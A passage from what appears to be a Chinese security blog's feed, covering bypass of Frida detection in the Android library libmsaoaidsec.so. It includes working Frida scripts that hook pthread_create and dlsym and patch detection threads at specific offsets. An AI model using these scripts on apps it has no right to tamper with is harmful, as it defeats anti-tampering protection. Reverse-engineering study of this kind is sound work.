function_">replace</span>(pthread_create_addr, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params">parg0, parg1, parg2, parg3</span>) &#123;  </span><br><span class="line">        <span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByAddress</span>(parg2)  </span><br><span class="line">        <span class="keyword">var</span> so_base = <span class="variable language_">module</span>.<span class="property">base</span>;  </span><br><span class="line">        <span class="keyword">var</span> off = <span class="string">&quot;0x&quot;</span> + parg2.<span class="title function_">sub</span>(so_base).<span class="title function_">toString</span>(<span class="number">16</span>)  </span><br><span class="line">        <span class="keyword">var</span> so_name = <span class="variable language_">module</span>.<span class="property">name</span>;  </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(so_name, off, parg3)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">pthread_create</span>(parg0, parg1, parg2, parg3);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]))  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_">setImmediate</span>(check_pthread_create)</span><br></pre></td></tr></table></figure><p>能看到libmsaoaidsec.so具体检测的地方<br>在这里终止!<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250301122751.png"                                        ><br>可以得到它加载的线程和偏移<br>接下来的思路就是nop掉它进行检测的线程</p><h2 id="尝试绕过"><a href="#尝试绕过" class="headerlink" title="尝试绕过"></a>尝试绕过</h2><h3 id="静态分析so——确定具体hook点"><a href="#静态分析so——确定具体hook点" class="headerlink" title="静态分析so——确定具体hook点"></a>静态分析so——确定具体hook点</h3><p>解包apk来获取<code>libmsaoaidsec.so</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apktool.jar d malware.apk -o output_folder</span><br></pre></td></tr></table></figure><p>从这个函数开始看 .init_proc<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250301124534.png"                                        ><br>在这里选择一个<em>尽量早执行并且使用外部函数</em>的函数<br>得到sub_123f0函数，可以看到它执行了一个sdk<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250301150619.png"                                        ><br>接下来就关注<code>_system_property_get</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">locate_init</span>(<span class="params"></span>) &#123;  </span><br><span class="line">    <span class="keyword">let</span> r = <span class="literal">null</span>  </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;__system_property_get&quot;</span>),  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  </span><br><span class="line">                <span class="keyword">var</span> name = args[<span class="number">0</span>];  </span><br><span class="line">                <span class="keyword">if</span> (name !== <span class="literal">undefined</span> &amp;&amp; name != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    name = <span class="title function_">ptr</span>(name).<span class="title function_">readCString</span>();  </span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(name)  </span><br><span class="line">                    <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&quot;ro.build.version.sdk&quot;</span>) &gt;= <span class="number">0</span>) &#123;  </span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libmsaoaidsec.so&quot;</span>).<span class="property">base</span>)  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    );  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>),  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  </span><br><span class="line">            <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];  </span><br><span class="line">            <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();  </span><br><span class="line">                <span class="keyword">if</span>(path.<span class="title function_">search</span>(<span class="string">&quot;libmsaoaidsec.so&quot;</span>) != -<span class="number">1</span>)&#123;  </span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>  </span><br><span class="line">                    <span class="title function_">locate_init</span>()  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>控制台的输出<br>得到了基址<code>0x71ea845000</code>，接着去尝试nop掉关键部分就好了<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250301153745.png"                                        ></p><h4 id="平坦流去混淆"><a href="#平坦流去混淆" class="headerlink" title="平坦流去混淆"></a>平坦流去混淆</h4><p><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250301152840.png"                                        ><br>代码结构中有大量的while和if else<br>分析完这个后可以找到加载早的函数有哪些</p><p>在获取了一个非常早的注入时机之后，就可以定位具体的frida检测点了。网上对frida的检测通常会使用openat、open、strstr、pthread_create、snprintf、sprintf、readlinkat等一系列函数，</p><h3 id="关键nop"><a href="#关键nop" class="headerlink" title="关键nop"></a>关键nop</h3><p><code>locate_init</code>函数在检测到<code>ro.build.version.sdk</code>属性被读取时，会找到目标库的基地址，并对三个偏移地址（0x1c544、0x1b8d4、0x26e5c）调用<code>nop_64</code>函数。<code>nop_64</code>函数的作用是将指定地址的指令替换为<code>ret</code>返回指令，从而绕过这些函数的执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">locate_init</span>(<span class="params"></span>) &#123;  </span><br><span class="line">    <span class="keyword">let</span> r = <span class="literal">null</span>  </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;__system_property_get&quot;</span>),  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  </span><br><span class="line">                <span class="keyword">var</span> name = args[<span class="number">0</span>];  </span><br><span class="line">                <span class="keyword">if</span> (name !== <span class="literal">undefined</span> &amp;&amp; name != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    name = <span class="title function_">ptr</span>(name).<span class="title function_">readCString</span>();  </span><br><span class="line">                    <span class="comment">//console.log(name)  </span></span><br><span class="line">                    <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&quot;ro.build.version.sdk&quot;</span>) &gt;= <span class="number">0</span>) &#123;  </span><br><span class="line">                        <span class="keyword">var</span>  r = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libmsaoaidsec.so&quot;</span>)  </span><br><span class="line">                        <span class="title function_">nop_64</span>(r.<span class="property">base</span>.<span class="title function_">add</span>(<span class="string">&quot;0x1c544&quot;</span>))  </span><br><span class="line">                        <span class="title function_">nop_64</span>(r.<span class="property">base</span>.<span class="title function_">add</span>(<span class="string">&quot;0x1b8d4&quot;</span>))  </span><br><span class="line">                        <span class="title function_">nop_64</span>(r.<span class="property">base</span>.<span class="title function_">add</span>(<span class="string">&quot;0x26e5c&quot;</span>))  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    );  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>),  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  </span><br><span class="line">            <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];  </span><br><span class="line">            <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();  </span><br><span class="line">                <span class="keyword">if</span>(path.<span class="title function_">search</span>(<span class="string">&quot;libmsaoaidsec.so&quot;</span>) != -<span class="number">1</span>)&#123;  </span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>  </span><br><span class="line">                    <span class="title function_">locate_init</span>()  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">nop_64</span>(<span class="params">addr</span>) &#123;  </span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">protect</span>(addr, <span class="number">4</span> , <span class="string">&#x27;rwx&#x27;</span>);  </span><br><span class="line">    <span class="keyword">var</span> w = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(addr);  </span><br><span class="line">    w.<span class="title function_">putRet</span>();  </span><br><span class="line">    w.<span class="title function_">flush</span>();  </span><br><span class="line">    w.<span class="title function_">dispose</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功进去<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250301154238.png"                                        ></p><h3 id="尝试绕过pthread-create检测——其他思路"><a href="#尝试绕过pthread-create检测——其他思路" class="headerlink" title="尝试绕过pthread_create检测——其他思路"></a>尝试绕过pthread_create检测——其他思路</h3><p>在执行<code>libmsaoaidsec.so</code>时nop掉pthread_create,或者替换它的返回结果<br>来自<a class="link"   href="https://blog.csdn.net/A_fanyifan/article/details/143864007" >https://blog.csdn.net/A_fanyifan/article/details/143864007<i class="fas fa-external-link-alt"></i></a><br>直接使用就可以，甚至偏移都是一样的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params">soName = <span class="string">&#x27;&#x27;</span></span>) &#123;  </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>),  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  </span><br><span class="line">                <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];  </span><br><span class="line">                <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();  </span><br><span class="line">                    <span class="keyword">if</span> (path.<span class="title function_">indexOf</span>(soName) &gt;= <span class="number">0</span>) &#123;  </span><br><span class="line">                        <span class="title function_">locate_init</span>()  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    );  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">locate_init</span>(<span class="params"></span>) &#123;  </span><br><span class="line">    <span class="keyword">let</span> secmodule = <span class="literal">null</span>  </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;__system_property_get&quot;</span>),  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="comment">// _system_property_get(&quot;ro.build.version.sdk&quot;, v1);  </span></span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  </span><br><span class="line">                secmodule = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libmsaoaidsec.so&quot;</span>)  </span><br><span class="line">                <span class="keyword">var</span> name = args[<span class="number">0</span>];  </span><br><span class="line">                <span class="keyword">if</span> (name !== <span class="literal">undefined</span> &amp;&amp; name != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    name = <span class="title function_">ptr</span>(name).<span class="title function_">readCString</span>();  </span><br><span class="line">                    <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&quot;ro.build.version.sdk&quot;</span>) &gt;= <span class="number">0</span>) &#123;  </span><br><span class="line">                        <span class="comment">// 这是.init_proc刚开始执行的地方，是一个比较早的时机点  </span></span><br><span class="line">                        <span class="comment">// do something  </span></span><br><span class="line">                        <span class="comment">// hook_pthread_create()                        bypass()  </span></span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    );  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_pthread_create</span>(<span class="params"></span>) &#123;  </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libmsaoaidsec.so --- &quot;</span> + <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libmsaoaidsec.so&quot;</span>).<span class="property">base</span>)  </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;pthread_create&quot;</span>), &#123;  </span><br><span class="line">        <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;  </span><br><span class="line">            <span class="keyword">let</span> func_addr = args[<span class="number">2</span>]  </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The thread function address is &quot;</span> + func_addr)  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">nopFunc</span>(<span class="params">parg2</span>) &#123;  </span><br><span class="line">    <span class="comment">// 修改内存保护，使其可写  </span></span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">protect</span>(parg2, <span class="number">4</span>, <span class="string">&#x27;rwx&#x27;</span>);  </span><br><span class="line">    <span class="comment">// 使用 Arm64Writer 写入 &#x27;ret&#x27; 指令  </span></span><br><span class="line">    <span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(parg2);  </span><br><span class="line">    writer.<span class="title function_">putRet</span>();  </span><br><span class="line">    writer.<span class="title function_">flush</span>();  </span><br><span class="line">    writer.<span class="title function_">dispose</span>();  </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;nop &quot;</span> + parg2 + <span class="string">&quot; success&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bypass</span>(<span class="params"></span>)&#123;  </span><br><span class="line">    <span class="keyword">let</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libmsaoaidsec.so&quot;</span>)  </span><br><span class="line">    <span class="title function_">nopFunc</span>(<span class="variable language_">module</span>.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x1c544</span>))  </span><br><span class="line">    <span class="title function_">nopFunc</span>(<span class="variable language_">module</span>.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x1b8d4</span>))  </span><br><span class="line">    <span class="title function_">nopFunc</span>(<span class="variable language_">module</span>.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x26e5c</span>))  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// pthread\_create libmsaoaidsec.so 0x1c544 0x731552b960\  </span></span><br><span class="line"><span class="comment">// pthread\_create libmsaoaidsec.so 0x1b8d4 0x0\  </span></span><br><span class="line"><span class="comment">// pthread\_create libmsaoaidsec.so 0x26e5c 0x0  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_">setImmediate</span>(hook_dlopen, <span class="string">&quot;libmsaoaidsec.so&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="fake替换"><a href="#fake替换" class="headerlink" title="fake替换"></a>fake替换</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">create_fake_pthread_create</span>(<span class="params"></span>) &#123;  </span><br><span class="line">    <span class="keyword">const</span> fake_pthread_create = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">4096</span>)  </span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">protect</span>(fake_pthread_create, <span class="number">4096</span>, <span class="string">&quot;rwx&quot;</span>)  </span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(fake_pthread_create, <span class="number">4096</span>, <span class="function"><span class="params">code</span> =&gt;</span> &#123;  </span><br><span class="line">        <span class="keyword">const</span> cw = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(code, &#123; <span class="attr">pc</span>: <span class="title function_">ptr</span>(fake_pthread_create) &#125;)  </span><br><span class="line">        cw.<span class="title function_">putRet</span>()  </span><br><span class="line">    &#125;)  </span><br><span class="line">    <span class="keyword">return</span> fake_pthread_create  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlsym</span>(<span class="params"></span>) &#123;  </span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">0</span>  </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=== HOOKING dlsym ===&quot;</span>)  </span><br><span class="line">    <span class="keyword">var</span> interceptor = <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;dlsym&quot;</span>),  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  </span><br><span class="line">                <span class="keyword">const</span> name = <span class="title function_">ptr</span>(args[<span class="number">1</span>]).<span class="title function_">readCString</span>()  </span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[dlsym]&quot;</span>, name)  </span><br><span class="line">                <span class="keyword">if</span> (name == <span class="string">&quot;pthread_create&quot;</span>) &#123;  </span><br><span class="line">                    count++  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;,  </span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>) &#123;  </span><br><span class="line">                <span class="keyword">if</span> (count == <span class="number">1</span>) &#123;  </span><br><span class="line">                    retval.<span class="title function_">replace</span>(fake_pthread_create)  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (count == <span class="number">2</span>) &#123;  </span><br><span class="line">                    retval.<span class="title function_">replace</span>(fake_pthread_create)  </span><br><span class="line">                    <span class="comment">// 完成2次替换, 停止hook dlsym  </span></span><br><span class="line">                    interceptor.<span class="title function_">detach</span>()  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    )  </span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Interceptor</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params"></span>) &#123;  </span><br><span class="line">    <span class="keyword">var</span> interceptor = <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>),  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  </span><br><span class="line">                <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];  </span><br><span class="line">                <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();  </span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[LOAD]&quot;</span>, path)  </span><br><span class="line">                    <span class="keyword">if</span> (path.<span class="title function_">indexOf</span>(<span class="string">&quot;libmsaoaidsec.so&quot;</span>) &gt; -<span class="number">1</span>) &#123;  </span><br><span class="line">                        <span class="title function_">hook_dlsym</span>()  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    )  </span><br><span class="line">    <span class="keyword">return</span> interceptor  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 创建虚假pthread_create  </span></span><br><span class="line"><span class="keyword">var</span> fake_pthread_create = <span class="title function_">create_fake_pthread_create</span>()  </span><br><span class="line"><span class="keyword">var</span> dlopen_interceptor = <span class="title function_">hook_dlopen</span>()</span><br></pre></td></tr></table></figure><p><a class="link"   href="https://bbs.kanxue.com/thread-281584.htm" >https://bbs.kanxue.com/thread-281584.htm<i class="fas fa-external-link-alt"></i></a><br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250302132904.png"                                        ></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://bbs.kanxue.com/thread-255674.htm" >https://bbs.kanxue.com/thread-255674.htm<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://blog.bingyue.top/2025/01/08/an_zhuo_ni_xiang_an_li_001/" >https://blog.bingyue.top/2025/01/08/an_zhuo_ni_xiang_an_li_001/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://blog.csdn.net/A_fanyifan/article/details/143864007" >https://blog.csdn.net/A_fanyifan/article/details/143864007<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://bbs.kanxue.com/thread-281584.htm" >https://bbs.kanxue.com/thread-281584.htm<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;检测点&quot;&gt;&lt;a href=&quot;#检测点&quot; class=&quot;headerlink&quot; title=&quot;检测点&quot;&gt;&lt;/a&gt;检测点&lt;/h2&gt;&lt;p&gt;检测Frida的机制一般在Native层实现，通常会创建几个线程轮询检测。&lt;/p&gt;
&lt;h3 id=&quot;查看检测的so&quot;&gt;&lt;a href</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>恶意软件开发前置</title>
    <link href="http://arch3rn4r.github.io/2025/01/04/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%911/"/>
    <id>http://arch3rn4r.github.io/2025/01/04/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%911/</id>
    <published>2025-01-03T16:57:43.000Z</published>
    <updated>2025-05-02T02:41:59.363Z</updated>
    
